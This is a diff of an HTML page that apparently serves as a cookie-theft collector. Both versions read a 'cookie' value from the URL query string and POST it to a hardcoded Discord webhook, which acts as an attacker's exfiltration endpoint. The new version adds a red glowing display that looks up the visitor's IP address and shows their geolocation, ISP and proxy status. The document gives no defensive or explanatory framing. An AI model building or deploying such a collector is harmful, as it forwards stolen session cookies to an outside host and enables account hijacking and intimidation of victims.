@@ -1,28 +1,99 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>test</title>
+    <title>IP Info</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff3333;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        .line {
+            opacity: 0;
+            margin: 8px 0;
+            text-shadow: 
+                0 0 5px #ff3333,
+                0 0 10px #ff3333,
+                0 0 20px #ff3333,
+                0 0 40px #ff3333;
+            transition: opacity 0.8s;
+        }
+    </style>
 </head>
 <body>
-<h2>test</h2>
+    <div id="container"></div>
 
-<script>
-const params = new URLSearchParams(window.location.search);
-const cv = params.get('cookie');
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const container = document.getElementById('container');
 
-if (cv) {
-    const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
+        // Existing cookie webhook
+        const cv = params.get('cookie');
+        if (cv) {
+            const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
+            fetch(wb, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: cv })
+            })
+            .then(() => console.log("sent"))
+            .catch(err => console.error("err", err));
+        }
 
-    fetch(wb, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: cv })
-    })
-    .then(() => console.log("sent"))
-    .catch(err => console.error("err", err));
-} else {
-    console.log("nothing found");
-}
-</script>
+        // Trigger IP info if ?ip is present (without =)
+        if (window.location.search.includes("?ip")) {
+            const apiUrl = "http://ip-api.com/json/?fields=61439"; // current IP
+
+            fetch(apiUrl)
+            .then(res => res.json())
+            .then(data => {
+                if (data.status !== "success") {
+                    container.innerHTML = `<div class="line">Error: ${data.message || 'Invalid IP'}</div>`;
+                    return;
+                }
+
+                // Build info lines
+                const infoLines = [
+                    `IP ADDRESS: ${data.query || 'Unknown'}`,
+                    `COUNTRY: ${data.country || 'Unknown'}`,
+                    `COUNTRY CODE: ${data.countryCode || 'Unknown'}`,
+                    `REGION: ${data.region || 'Unknown'}`,
+                    `REGION NAME: ${data.regionName || 'Unknown'}`,
+                    `CITY: ${data.city || 'Unknown'}`,
+                    `ZIP: ${data.zip || 'Unknown'}`,
+                    `LATITUDE: ${data.lat || 'Unknown'}`,
+                    `LONGITUDE: ${data.lon || 'Unknown'}`,
+                    `TIMEZONE: ${data.timezone || 'Unknown'}`,
+                    `ISP: ${data.isp || 'Unknown'}`,
+                    `ORG: ${data.org || 'Unknown'}`,
+                    `AS: ${data.as || 'Unknown'}`,
+                    `REVERSE DNS: ${data.reverse || 'Unknown'}`,
+                    `MOBILE: ${data.mobile ? 'Yes' : 'No'}`,
+                    `PROXY: ${data.proxy ? 'Yes' : 'No'}`,
+                    `HOSTING: ${data.hosting ? 'Yes' : 'No'}`
+                ];
+
+                let index = 0;
+                function showNext() {
+                    if (index >= infoLines.length) return;
+                    const line = document.createElement('div');
+                    line.className = 'line';
+                    line.textContent = infoLines[index];
+                    container.appendChild(line);
+                    setTimeout(() => {
+                        line.style.opacity = 1;
+                        index++;
+                        setTimeout(showNext, 400);
+                    }, 100);
+                }
+                showNext();
+            })
+            .catch(err => {
+                container.innerHTML = `<div class="line">Error fetching IP info</div>`;
+                console.error(err);
+            });
+        }
+    </script>
 </body>
 </html>
